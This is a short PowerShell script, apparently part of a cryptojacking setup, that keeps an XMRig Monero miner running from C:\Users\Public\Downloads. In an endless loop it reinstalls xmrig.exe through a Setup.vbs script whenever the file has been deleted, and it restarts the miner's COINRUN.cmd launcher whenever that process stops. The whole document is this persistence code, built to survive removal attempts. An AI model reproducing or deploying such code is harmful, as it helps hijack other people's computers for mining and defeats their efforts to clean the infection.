$xmrigPath = "C:\Users\Public\Downloads\xmrig-6.22.2\xmrig.exe"
$setupPath = "C:\Users\Public\Downloads\Setup.vbs"
$coinRunPath = "C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd"

function Start-CoinRun {
    $global:coinRunProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$coinRunPath`"" -PassThru
    Write-Host "coinrun.cmd START"
}

while ($true) {
    if (!(Test-Path $xmrigPath)) {
        Write-Warning "xmrig.exe Del. Wait..."

        if (Test-Path $setupPath) {
            Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
            Write-Host "Run Setup.vbs!"

            while (!(Test-Path $xmrigPath)) {
                Write-Host "Wait.. xmrig.exe"
                Start-Sleep -Seconds 3
            }

            Write-Host "Đã phát hiện lại xmrig.exe. Khởi động coinrun.cmd"
            Start-CoinRun
        } else {
            Write-Error "NO Setup.vbs: $setupPath"
        }
    }

    if ($global:coinRunProcess -and $global:coinRunProcess.HasExited) {
        Write-Warning "coinrun.cmd STOP. Reboot..."
        Start-CoinRun
    } elseif ($global:coinRunProcess) {
        Write-Host "coinrun.cmd running..."
    }

    Start-Sleep -Seconds 3
}
